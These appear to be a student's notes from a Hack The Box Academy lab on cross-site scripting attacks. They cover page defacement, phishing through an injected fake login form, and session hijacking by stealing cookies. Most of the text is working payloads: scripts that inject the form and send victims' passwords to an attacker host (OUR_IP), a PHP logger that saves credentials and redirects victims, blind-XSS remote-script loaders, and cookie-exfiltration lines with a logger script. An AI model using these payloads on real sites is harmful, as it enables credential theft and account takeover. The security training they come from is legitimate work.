# Defacing
One of the most common attacks usually used with stored XSS vulnerabilities is website defacing attacks. `Defacing` a website means changing its look for anyone who visits the website.
## Defacement Elements
Four HTML elements are usually utilized to change the main look of a web page:

- Background Color `document.body.style.background`
- Background `document.body.background`
- Page Title `document.title`
- Page Text `DOM.innerHTML`

We can utilize two or three of these elements to write a basic message to the web page and even remove the vulnerable element, such that it would be more difficult to quickly reset the web page, as we will see next.
## Changing Background
To change a web page's background, we can choose a certain color or use an image. We will use a color as our background:
```html
<script>document.body.style.background = "#141d2b"</script>
```
- We can use any other hex value, or can use a named color like `= "black"`.

Another option would be to set an image to the background using the following payload:
```html
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
```
## Changing Page Title
We can change the page title to any title of our choosing, using the `document.title` JavaScript property:
```html
<script>document.title = 'HackTheBox Academy'</script>
```
## Changing Page Text
We can change the text of a specific HTML element/DOM using the `innerHTML` property:
```javascript
document.getElementById("todo").innerHTML = "New Text"
```

We can also utilize jQuery functions for more efficiently achieving the same thing or for changing the text of multiple elements in one line (to do so, the `jQuery` library must have been imported within the page source):
```javascript
$("#todo").html('New Text');
```

With this, we can change the entire HTML code of the main `body`, using `innerHTML`, as follows:
```javascript
document.getElementsByTagName('body')[0].innerHTML = "New Text"
```
- We can specify the `body` element with `document.getElementsByTagName('body')`, and by specifying `[0]`, we are selecting the first `body` element

# Phishing
A common form of XSS phishing attacks is through injecting fake login forms that send the login details to the attacker's server, which may then be used to log in on behalf of the victim and gain control over their account and sensitive information.
## Example
### XSS Discovery
We start by attempting to find the XSS vulnerability in the web application at `/phishing`.

We can see this site is a simple online image viewer, where we can input a URL of an image, and it'll display it: `http://SERVER_IP/phishing/index.php?url=https://www.hackthebox.eu/images/logo-htb.svg`
![Online Image Viewer with Hack The Box logo.](https://academy.hackthebox.com/storage/modules/103/xss_phishing_image_viewer.jpg)

As we have control over the URL, we can start by using the basic XSS payload we've been using. But when we try that payload, we see that nothing gets executed, and we get the `dead image url` icon: 
`http://SERVER_IP/phishing/index.php?url=<script>alert(window.origin)</script>`

![Online Image Viewer with Image URL input.](https://academy.hackthebox.com/storage/modules/103/xss_phishing_alert.jpg)

So, we must run the XSS Discovery process we previously learned to find a working XSS payload. 

>Tip: To understand which payload should work, try to view how your input is displayed in the HTML source after you add it.
### Login Form Injection
Once we identify a working XSS payload, we can proceed to the phishing attack. 

Payload for this example: 
```javascript
'><script>alert(1)</script>
```

To perform an XSS phishing attack, we must inject an HTML code that displays a login form on the targeted page. 
- This form should send the login information to a server we are listening on, such that once a user attempts to log in, we'd get their credentials.

We can easily find an HTML code for a basic login form, or we can write our own login form. The following example should present a login form:
```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

In the above HTML code, `OUR_IP` is the IP of our VM, which we can find with the (`ip a`) command under `tun0`. We will later be listening on this IP to retrieve the credentials sent from the form. The login form should look as follows:
```html
<div>
<h3>Please login to continue</h3>
<input type="text" placeholder="Username">
<input type="text" placeholder="Password">
<input type="submit" value="Login">
<br><br>
</div>
```

To write HTML code to the vulnerable page, we can use the JavaScript function `document.write()`, and use it in the XSS payload we found earlier in the XSS Discovery step.

Once we minify our HTML code into a single line and add it inside the `write` function, the final JavaScript code should be as follows:
```javascript
'><script>document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');</script>
```
### Cleaning Up
We can see that the URL field is still displayed, which defeats our line of "`Please login to continue`". 

We should remove the URL field, such that they may think that they have to log in to be able to use the page.

To do so, we can use the JavaScript function `document.getElementById().remove()` function.

To find the `id` of the HTML element we want to remove, we can open the `Page Inspector Picker` by clicking `CTRL+SHIFT+C` and then clicking on the element we need.

As we see in both the source code and the hover text, the `url` form has the id `urlform`:
```html
<form role="form" action="index.php" method="GET" id='urlform'>
    <input type="text" placeholder="Image URL" name="url">
</form>
```

So, we can now use this id with the `remove()` function to remove the URL form:
```javascript
document.getElementById('urlform').remove();
```

Now, once we add this code to our previous JavaScript code (after the `document.write` function), we can use this new JavaScript code in our payload:

```javascript
'><script>document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script>
```

When we try to inject our updated JavaScript code, we see that the URL form is indeed no longer displayed.

We also see that there's still a piece of the original HTML code left after our injected login form. This can be removed by simply commenting it out, by adding an HTML opening comment after our XSS payload:
```html
...PAYLOAD... <!-- 
```

The page now looks like it legitimately requires a login.

We can now copy the final URL that should include the entire payload, and we can send it to our victims and attempt to trick them into using the fake login form.
## Credential Stealing
If you tried to log into the injected login form, you would probably get the error `This site can’t be reached`
- This is because our HTML form is designed to send the login request to our IP, which should be listening for a connection. If we are not listening for a connection, we will get a `site can’t be reached` error.

We can start a simple `netcat` server:
```
nc -lnvp 80
```
Now attempt to login with credentials and check the `netcat` output we get.
- `don't forget to replace OUR_IP in the XSS payload with your actual IP`

As we can see, we can capture the credentials in the HTTP request URL (`/?username=test&password=test`). If any victim attempts to log in with the form, we will get their credentials.

However, as we are only listening with a `netcat` listener, the victim would get an `Unable to connect` error, which may raise some suspicions.

We can use a basic PHP script that logs the credentials from the HTTP request and then returns the victim to the original page without any injections.
- In this case, the victim may think that they successfully logged in and will use the Image Viewer as intended.

The following PHP script should do what we need, and we will write it to a file on our VM that we'll call `index.php` and place it in `/tmp/tmpserver/` 
- (`don't forget to replace SERVER_IP with the domain name of the site`):
```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

Now that we have our `index.php` file ready, we can start a `PHP` listening server, which we can use instead of the basic `netcat` listener we used earlier:
```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
vi in
dex.php #at this step we wrote our index.php file
sudo php -S 0.0.0.0:80
```

Upon logging in, we see that we get redirected to the original Image Viewer page.

If we check the `creds.txt` file, we see that we did get the login credentials.
# Session Hijacking
Modern web applications utilize cookies to maintain a user's session throughout different browsing sessions. If a malicious user obtains the cookie data from the victim's browser, they may be able to gain logged-in access with the victim's user without knowing their credentials.

With the ability to execute JavaScript code on the victim's browser, we may be able to collect their cookies and send them to our server to hijack their logged-in session by performing a `Session Hijacking` (aka `Cookie Stealing`) attack.
## Blind XSS Detection
A Blind XSS vulnerability occurs when the vulnerability is triggered on a page we don't have access to.

Usually occur with forms only accessible by certain users (e.g., Admins). Some potential examples include:

- Contact Forms
- Reviews
- User Details
- Support Tickets
- HTTP User-Agent header
### Example Scenario
on (`/hijacking`) in the server at the end of this section. We see a User Registration page with multiple fields, so we submit a `test` user to see how the form handles the data.

We get the following response:
![Thank you for registering. An Admin will review your registration request.](https://academy.hackthebox.com/storage/modules/103/xss_blind_test_form_output.jpg)

This indicates that we will not see how our input will be handled or how it will look in the browser since it will appear only for the Admin.

In normal (i.e., non-blind) cases, we can test each field until we get an `alert` box, However, as we do not have access over the Admin panel in this case, how would we be able to detect an XSS vulnerability if we cannot see how the output is handled?

We can use the same trick we used in the previous section, which is to use a JavaScript payload that sends an HTTP request back to our server.
- If the JavaScript code gets executed, we will get a response on our machine = vulnerable page

However, this introduces two issues:
1. How can we know which specific field is vulnerable?
	- Since any of the fields may execute our code, we can't know which of them did.
2. How can we know what XSS payload to use?
	- Since the page may be vulnerable, but the payload may not work?
#### Loading a Remote Script
We can write JavaScript code within the `<script>` tag, but we can also include a remote script by providing its URL, as follows:
```html
<script src="http://OUR_IP/script.js"></script>
```
- We can use this to execute a remote JavaScript file that is served on our VM.

We can change the requested script name from `script.js` to the name of the field we are injecting in so when we get the request in our VM, we can identify the vulnerable input field that executed the script, as follows:
```html
<script src="http://OUR_IP/username"></script>
```
- If we get a request for `/username`, then we know that the `username` field is vulnerable to XSS, and so on.

With that, we can start testing various XSS payloads that load a remote script and see which of them sends us a request. The following are a few examples we can use from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss):
```html
<script src=http://OUR_IP></script>

'><script src=http://OUR_IP></script>

"><script src=http://OUR_IP></script>

javascript:eval('var a=document.createElement(\'script\');a.src=\'http://10.10.14.17\';document.body.appendChild(a)')

<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>

<script>$.getScript("http://OUR_IP")</script>
```
- Various payloads start with an injection like `'>`, which may or may not work depending on how our input is handled in the backend.
- If we had access to the source code (i.e., in a DOM XSS), it would be possible to precisely write the required payload

Before sending payloads, we can start a listener using `nc` or `php`:
```bash
nc -lnvp 80
```
```php
mkdir /tmp/tmpserver
cd /tmp/tmpserver
sudo php -S 0.0.0.0:80
```

Now we can start testing these payloads one by one by using one of them for all of input fields and appending the name of the field after our IP, as mentioned earlier, like:
```html
<script src=http://OUR_IP/fullname></script> #this goes inside the full-name field
<script src=http://OUR_IP/username></script> #this goes inside the username field
etc... etc...
```

Once we submit the form, we wait a few seconds, and if nothing calls our server, then we can proceed to the next payload.

Once we receive a call to our server, we should note the last XSS payload we used as a working payload and note the input field name
## Session Hijacking Attack
```
javascript:eval('var a=document.createElement(\'fullname\');a.src=\'http://10.10.15.243/\';document.body.appendChild(a)')
```

Requires a JavaScript payload to send us the required data and a PHP script hosted on our server to grab and parse the transmitted data.

There are multiple JavaScript payloads we can use to grab the session cookie and send it to us, as shown by [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc):
```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;

new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

We can write any of these JavaScript payloads to `script.js`, which will be hosted on our VM.

Now, we can change the URL in the XSS payload we found earlier to use `script.js`.
```html
<script src=http://OUR_IP/script.js></script>
```

With our PHP server running, we can now use the code as part of our XSS payload, send it in the vulnerable input field, and we should get a call to our server with the cookie value.

If there were many cookies, we may not know which cookie value belongs to which cookie header. So, we can write a PHP script to split them with a new line and write them to a file.
- In this case, even if multiple victims trigger the XSS exploit, we'll get all of their cookies ordered in a file.

We can save the following PHP script as `index.php`, and re-run the PHP server again:
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Now, we wait for the victim to visit the vulnerable page and view our XSS payload.

We get the cookie value right in the terminal, and since we prepared a PHP script, we also get the `cookies.txt` file with a clean log of cookies.

We can use this cookie on the `login.php` page to access the victim's account. To do so, once we navigate to `/hijacking/login.php`, we can click `Shift+F9` in Firefox to reveal the `Storage` bar in the Developer Tools. Then, we can click on the `+` button on the top right corner and add our cookie, where the `Name` is the part before = and the `Value` is the part after = from our stolen cookie:
![Storage tab showing cookie details: Name 'cookie', Value 'f904f93c949d19d870911bf8b05fe7b2', Path '/hijacking', Size 38.](https://academy.hackthebox.com/storage/modules/103/xss_blind_set_cookie_2.jpg)

Refresh the page and we get access.
